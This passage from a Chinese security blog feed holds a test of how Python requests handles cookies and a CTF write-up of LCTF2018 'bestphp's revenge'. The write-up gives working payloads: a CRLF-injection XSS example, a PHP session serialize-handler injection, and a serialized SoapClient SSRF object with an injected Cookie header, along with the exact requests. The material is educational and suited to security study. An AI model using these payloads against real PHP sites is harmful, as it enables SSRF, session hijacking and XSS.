class="token punctuation">]</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestss <span class="token operator">=</span> requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span>url <span class="token operator">=</span> <span class="token string">'http://127.0.0.1/2.php'</span>cookies <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'a'</span><span class="token punctuation">:</span> <span class="token string">'aaa'</span><span class="token punctuation">&#125;</span>r <span class="token operator">=</span> s<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span> cookies<span class="token operator">=</span>cookies<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token punctuation">[</span><span class="token string double-quoted-string">"a"</span><span class="token punctuation">]</span><span class="token operator">=></span>  <span class="token keyword type-declaration">string</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span> <span class="token string double-quoted-string">"aaa"</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="测试3"><a href="#测试3" class="headerlink" title="测试3"></a>测试3</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'TEST'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'TEST'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"PHPSESSID"</span><span class="token punctuation">]</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'  '</span> <span class="token operator">.</span> <span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'TEST'</span><span class="token punctuation">]</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestss <span class="token operator">=</span> requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span>cookies <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'PHPSESSID'</span><span class="token punctuation">:</span> <span class="token string">'vepn9g7r3lqfc23skjn06te693'</span><span class="token punctuation">,</span> <span class="token string">'TEST'</span><span class="token punctuation">:</span> <span class="token string">'FIX'</span><span class="token punctuation">&#125;</span>url <span class="token operator">=</span> <span class="token string">'http://127.0.0.1/1.php'</span>r <span class="token operator">=</span> s<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span> cookies<span class="token operator">=</span>cookies<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"第1次get："</span> <span class="token operator">+</span> r<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"第1次的cookies："</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>cookies<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"第1次的session的cookies ："</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>s<span class="token punctuation">.</span>cookies<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'------------------------------------'</span><span class="token punctuation">)</span>r <span class="token operator">=</span> s<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"第2次get："</span> <span class="token operator">+</span> r<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"第2次的cookies："</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>cookies<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"第2次的session的cookies ："</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>s<span class="token punctuation">.</span>cookies<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'------------------------------------'</span><span class="token punctuation">)</span>r <span class="token operator">=</span> s<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span> cookies<span class="token operator">=</span>cookies<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"第3次get："</span> <span class="token operator">+</span> r<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"第3次的cookies："</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>cookies<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"第3次的session的cookies ："</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>s<span class="token punctuation">.</span>cookies<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'------------------------------------'</span><span class="token punctuation">)</span>r <span class="token operator">=</span> s<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"第4次get："</span> <span class="token operator">+</span> r<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"第4次的cookies："</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>cookies<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"第4次的session的cookies ："</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>s<span class="token punctuation">.</span>cookies<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">第1次get：vepn9g7r3lqfc23skjn06te693  FIX第1次的cookies：&lt;RequestsCookieJar[&lt;Cookie TEST&#x3D;TEST for 127.0.0.1&#x2F;&gt;]&gt;第1次的session的cookies ：&lt;RequestsCookieJar[&lt;Cookie TEST&#x3D;TEST for 127.0.0.1&#x2F;&gt;]&gt;------------------------------------第2次get：  TEST第2次的cookies：&lt;RequestsCookieJar[&lt;Cookie PHPSESSID&#x3D;5r5fbk2ljn1n7jo1so7s5qjjuc for 127.0.0.1&#x2F;&gt;, &lt;Cookie TEST&#x3D;TEST for 127.0.0.1&#x2F;&gt;]&gt;第2次的session的cookies ：&lt;RequestsCookieJar[&lt;Cookie PHPSESSID&#x3D;5r5fbk2ljn1n7jo1so7s5qjjuc for 127.0.0.1&#x2F;&gt;, &lt;Cookie TEST&#x3D;TEST for 127.0.0.1&#x2F;&gt;]&gt;------------------------------------第3次get：5r5fbk2ljn1n7jo1so7s5qjjuc  TEST第3次的cookies：&lt;RequestsCookieJar[&lt;Cookie TEST&#x3D;TEST for 127.0.0.1&#x2F;&gt;]&gt;第3次的session的cookies ：&lt;RequestsCookieJar[&lt;Cookie PHPSESSID&#x3D;5r5fbk2ljn1n7jo1so7s5qjjuc for 127.0.0.1&#x2F;&gt;, &lt;Cookie TEST&#x3D;TEST for 127.0.0.1&#x2F;&gt;]&gt;------------------------------------第4次get：5r5fbk2ljn1n7jo1so7s5qjjuc  TEST第4次的cookies：&lt;RequestsCookieJar[&lt;Cookie TEST&#x3D;TEST for 127.0.0.1&#x2F;&gt;]&gt;第4次的session的cookies ：&lt;RequestsCookieJar[&lt;Cookie PHPSESSID&#x3D;5r5fbk2ljn1n7jo1so7s5qjjuc for 127.0.0.1&#x2F;&gt;, &lt;Cookie TEST&#x3D;TEST for 127.0.0.1&#x2F;&gt;]&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h3><p>无论是常规get还是session，流程都是：</p><p><strong>HTTP请求-&gt;Server设置COOKIES-&gt;把COOKIES传回Client-&gt;Client第二次请求-&gt;Server获取对应Cookies。</strong></p><p>第一次请求的时候Client还没有Cookies所以不会打印cookies。</p><p>经过测试，发现<code>PHPSESSID</code>这个Cookie很特殊，用Session的话只有在第一次客户端设定session并返回的时候才会出现在<code>r</code>的<code>cookies</code>里(因为需要把cookies返回)，之后就会交给<code>s</code>进行管理。</p><p>而且在session成型之后，就无法直接添加到get/post里的cookies参数进行传值了，需要添加到session里。</p><p>所以方便起见，session就老老实实用<code>cookies.update()</code></p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>刷题笔记:bestphp&#39;s revenge</title>
      <link href="/p/3063917200.html"/>
      <url>/p/3063917200.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>关键字:[SoapClient|call_user_func|ssrf]</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-bestphp-s-revenge/image-20210812194724455.png"></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'implode'</span><span class="token punctuation">;</span><span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'f'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$_POST</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token function">reset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'welcome_to_the_lctf2018'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">,</span> <span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span> array(0) &#123; &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p>/flag.php返回</p><pre class="line-numbers language-none"><code class="language-none">only localhost can get flag!session_start();echo &#39;only localhost can get flag!&#39;;$flag &#x3D; &#39;LCTF&#123;*************************&#125;&#39;; if($_SERVER[&quot;REMOTE_ADDR&quot;]&#x3D;&#x3D;&#x3D;&quot;127.0.0.1&quot;)&#123; $_SESSION[&#39;flag&#39;] &#x3D; $flag; &#125;only localhost can get flag!<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>明显是SSRF</p><h3 id="call-user-func知识点"><a href="#call-user-func知识点" class="headerlink" title="call_user_func知识点"></a>call_user_func知识点</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">function</span> <span class="token function-definition function">func</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token variable">$a</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token variable">$b</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'func'</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"111"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"222"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'func'</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"333"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"444"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//显示 111 222 333 444</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>如果传入的参数是一个数组，且数组的第一个值是一个类/对象，那么，就会把数组的第二个值，当做方法，然后执行。</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">a</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">function</span> <span class="token function-definition function">b</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token variable">$c</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"a"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"b"</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"111"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//call_user_func(array(类名, 函数名),"111");</span><span class="token comment">//显示 111</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="CRLF-Injection漏洞"><a href="#CRLF-Injection漏洞" class="headerlink" title="CRLF Injection漏洞"></a>CRLF Injection漏洞</h3><p><a href="https://www.jianshu.com/p/d4c304dbd0af">[转载]CRLF Injection漏洞的利用与实例分析</a></p><blockquote><p>CRLF是”回车(%0d)+换行(%0a)”（\r\n）的简称。在HTTP协议中，HTTPHeader与HTTPBody是用两个CRLF分隔的，浏览器就是根据这两个CRLF来取出HTTP内容并显示出来。所以，一旦我们能够控制HTTP消息头中的字符，注入一些恶意的换行，这样我们就能注入一些会话Cookie或者HTML代码，所以CRLFInjection又叫HTTPResponseSplitting，简称HRS。</p></blockquote><p>比如一个302跳转：<a href="http://127.0.0.1/?url=http://www.sina.com.cn">http://127.0.0.1/?url=http://www.sina.com.cn</a></p><pre class="line-numbers language-none"><code class="language-none">HTTP&#x2F;1.1 302Moved Temporarily Date: Fri, 27 Jun 2014 17:52:17 GMTContent- Type: text&#x2F;htmlContent-Length: 154Connection: closeLocation:http:&#x2F;&#x2F;www.sina.com.cn<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>我输入：</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;www.sina.com.cn%0aSet-cookie:JSPSESSID%3Dwooyun<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>返回的数据包就是</p><pre class="line-numbers language-none"><code class="language-none">HTTP&#x2F;1.1 302 Moved Temporarily Date: Fri, 27 Jun 2014 17:52:17 GMTContent-Type: text&#x2F;htmlContent-Length: 154Connection: closeLocation: http:&#x2F;&#x2F;www.sina.com.cn Set-cookie: JSPSESSID&#x3D;wooyun<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>还可以用来xss</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;test.sina.com.cn&#x2F;?url&#x3D;%0d%0a%0d%0a&lt;imgsrc&#x3D;1onerror&#x3D;alert(&#x2F;xss&#x2F;)&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>浏览器会根据第一个CRLF把HTTP包分成header和body，然后将body显示出来。于是我们这里这个标签就会显示出来，造成一个xss。</p><p>关于这题的<code>SoapClient</code>类，没有指定cookie，但又<code>user_agent</code>，所以可以在<code>user_agent</code>里加上一个<code>\r\n</code>再加cookie。</p><h3 id="serialize-hander处理session方式不同导致session注入"><a href="#serialize-hander处理session方式不同导致session注入" class="headerlink" title="serialize_hander处理session方式不同导致session注入"></a>serialize_hander处理session方式不同导致session注入</h3><p>首先，session中的内容并不是放在内存中的，而是默认以文件的方式来存储的，可由配置项session.save_handler来进行确定。存储的文件是以sess_sessionid来进行命名的，文件的内容就是session值的序列化之后的内容。</p><p>然后，php序列化引擎也有不同表现：</p><p><a href="https://blog.spoock.com/2016/10/16/php-serialize-problem/">PHP中SESSION反序列化机制</a></p><ul><li><p>php_serialize引擎</p><pre class="line-numbers language-none"><code class="language-none">$_SESSION[&#39;name&#39;] &#x3D; &#39;sky&#39;;a:1:&#123;s:4:&quot;name&quot;;s:3:&quot;sky&quot;;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p>PHP引擎</p><pre class="line-numbers language-none"><code class="language-none">$_SESSION[&#39;name&#39;] &#x3D; &#39;sky&#39;;name|s:3:&quot;sky&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p>php_binary引擎</p><p>键名的长度对应的ascii字符+键名+经过serialize()函数序列化后的值</p></li></ul><p>在这里就有反序列化漏洞了，如果用<code>php_serialize</code>做序列化引擎，且<code>php_serialize</code>做序列化引擎</p><pre class="line-numbers language-none"><code class="language-none">$_SESSION[&#39;name&#39;] &#x3D; &#39;|sky&#39;;a:1:&#123;s:4:&quot;name&quot;;s:3:&quot;|sky&quot;;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>然后再用PHP引擎去反序列化，因为php以<code>|</code>符号分隔键与值，所以就会变成<code>a:1:&#123;s:4:&quot;name&quot;;s:3:&quot;</code>=<code>sky</code>的情况，这样sky就被单独拿了出来进行<strong>反序列化</strong>，而不是作为字符串打印出来。至于后面的<code>&quot;;&#125;s</code>，php反序列化的规则是<strong>前方闭合后面就忽略</strong>(这也是反序列化字符串逃逸的原理)。</p><p>php默认是用PHP引擎，可用<code>ini_set(&#39;session.serialize_handler&#39;, &#39;需要设置的引擎&#39;)</code>切换，但参数不支持数组。</p><p>所以此题用</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"serialize_handler"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"php_serialize"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="SoapClient-SSRF"><a href="#SoapClient-SSRF" class="headerlink" title="SoapClient SSRF"></a>SoapClient SSRF</h3><blockquote><p>如果提示<code>Class &#39;SoapClient&#39; not found</code>就在php.ini里启用extension=php_soap.dll</p></blockquote><blockquote><p>SOAP是webService三要素（SOAP、WSDL(WebServicesDescriptionLanguage)、UDDI(UniversalDescriptionDiscovery andIntegration)）之一：WSDL 用来描述如何访问具体的接口， UDDI用来管理，分发，查询webService ，SOAP（简单对象访问协议）是连接或Web服务或客户端和Web服务之间的接口。其采用HTTP作为底层通讯协议，XML作为数据传送的格式。<br>SoapClient类可以创建soap数据报文，与wsdl接口进行交互。</p></blockquote><p>这是一个php内置的类，当__call方法被触发后，它可以发送HTTP和HTTPS请求。该类的构造函数如下</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token class-name static-context">SoapClient</span> <span class="token operator">::</span> <span class="token constant">SoapClient</span> （<span class="token keyword type-declaration">mixed</span> <span class="token variable">$wsdl</span> <span class="token punctuation">[</span>，<span class="token keyword type-declaration">array</span> <span class="token variable">$options</span> <span class="token punctuation">]</span>）<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>第一个参数是用来指明是否是wsdl模式</p><p>第二个参数为一个数组，如果在wsdl模式下，此参数可选；如果在非wsdl模式下，则必须设置location和uri选项，其中location是要将请求发送到的SOAP服务器的URL，而uri是SOAP服务的目标命名空间。</p><p>知道上述两个参数的含义后，就很容易构造出SSRF的利用payload了。我们可以设置第一个参数为null，然后第二个参数的location选项设置为target_url</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SoapClient</span><span class="token punctuation">(</span><span class="token constant">null</span><span class="token punctuation">,</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'location'</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"http://127.0.0.1/flag.php"</span><span class="token punctuation">,</span>                                 <span class="token string single-quoted-string">'uri'</span><span class="token operator">=></span> <span class="token string double-quoted-string">"123"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="解析"><a href="#解析" class="headerlink" title="解析"></a>解析</h3><h4 id="写入session"><a href="#写入session" class="headerlink" title="写入session"></a>写入session</h4><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$target</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"http://127.0.0.1/flag.php"</span><span class="token punctuation">;</span><span class="token variable">$attack</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SoapClient</span><span class="token punctuation">(</span><span class="token constant">null</span><span class="token punctuation">,</span> <span class="token keyword">array</span><span class="token punctuation">(</span>    <span class="token string single-quoted-string">'location'</span> <span class="token operator">=></span> <span class="token variable">$target</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'user_agent'</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"N0rth3ty\r\nCookie: PHPSESSID=817olmp68ukmnofc2mlp762ql0\r\n"</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'uri'</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"123"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$payload</span> <span class="token operator">=</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$attack</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$payload</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>生成payload，然后在前面加个<code>|</code></p><pre class="line-numbers language-url" data-language="url"><code class="language-url">?name&#x3D;|O%3A10%3A%22SoapClient%22%3A4%3A%7Bs%3A3%3A%22uri%22%3Bs%3A3%3A%22123%22%3Bs%3A8%3A%22location%22%3Bs%3A25%3A%22http%3A%2F%2F127.0.0.1%2Fflag.php%22%3Bs%3A11%3A%22_user_agent%22%3Bs%3A56%3A%22N0rth3ty%0D%0ACookie%3A+PHPSESSID%3D817olmp68ukmnofc2mlp762ql0%0D%0A%22%3Bs%3A13%3A%22_soap_version%22%3Bi%3A1%3B%7D&amp;f&#x3D;session_startPOST:serialize_handler&#x3D;php_serialize<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-bestphp-s-revenge/image-20210813005433053.png"></p><p>1.利用<code>call_user_func($_GET[‘f’], $_POST);</code>函数，改变此页面的序列化引擎为<code>php_serialize</code></p><p>2.<code>$_SESSION[&#39;name&#39;] = $_GET[&#39;name&#39;];</code>将构造的序列化对象传入session中，并在前面加一个<code>|</code>符号。此时session会以<code>php_serialize</code>的规则储存。</p><h4 id="触发反序列化"><a href="#触发反序列化" class="headerlink" title="触发反序列化"></a>触发反序列化</h4><pre class="line-numbers language-none"><code class="language-none">?f&#x3D;extractPOST:b&#x3D;call_user_func<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-bestphp-s-revenge/image-20210813010632531.png"></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token punctuation">[</span><span class="token string double-quoted-string">"a:1:&#123;s:4:"</span>name<span class="token string double-quoted-string">";s:199:"</span><span class="token string double-quoted-string">"]=> object(SoapClient)#1 (4) &#123; ["</span>uri<span class="token string double-quoted-string">"]=> string(3) "</span><span class="token number">123</span><span class="token string double-quoted-string">" ["</span>location<span class="token string double-quoted-string">"]=> string(25) "</span>http<span class="token punctuation">:</span><span class="token comment">//127.0.0.1/flag.php" ["_user_agent"]=> string(56) "N0rth3ty Cookie: PHPSESSID=817olmp68ukmnofc2mlp762ql0 " ["_soap_version"]=> int(1) &#125; &#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>1.用<code>extract()</code>函数将<code>$b</code>覆盖为<code>call_user_func</code></p><p>2.此时序列化引擎又变为默认的php了，然后执行<code>session_start()</code>，则会读取刚刚序列化好的文件，进行反序列化。</p><p>3.<code>$a = array(reset($_SESSION), &#39;welcome_to_the_lctf2018&#39;);</code>，<code>reset</code>指针前移到开头，把session和字符串合并为一个数组。</p><p>4.</p><pre class="line-numbers language-none"><code class="language-none">&#96;call_user_func($b, $a);&#96;&#x3D;&#96;call_user_func(call_user_func, $a);&#96;&#x3D;&#96;call_user_func($a)&#96;&#x3D;&#96;call_user_func(array(reset($_SESSION), &#39;welcome_to_the_lctf2018&#39;);)&#96;,<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后会执行函数名为<code>welcome_to_the_lctf2018</code>的方法，显然，这个方法不存在，就调用了<code>SoapClient</code>类魔术方法<code>__call()</code>然后执行一个请求(这是由<code>SoapClient</code>类的内部代码决定的)</p><h4 id="改cookie"><a href="#改cookie" class="headerlink" title="改cookie"></a>改cookie</h4><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-bestphp-s-revenge/image-20210813010738280.png"></p><h2 id="奇文共赏"><a href="#奇文共赏" class="headerlink" title="奇文共赏"></a>奇文共赏</h2><p><a href="https://blog.csdn.net/weixin_44077544/article/details/102960092">https://blog.csdn.net/weixin_44077544/article/details/102960092</a></p><p><a href="https://www.cnblogs.com/iamstudy/articles/unserialize_in_php_inner_class.html">反序列化之PHP原生类的利用</a></p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> PHP代码审计 </tag>
            
            <tag> SSRF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>记一次electron反编译之JavaScript简单混淆记录</title>
      <link href="/p/2475939034.html"/>
      <url>/p/2475939034.html</url>
      
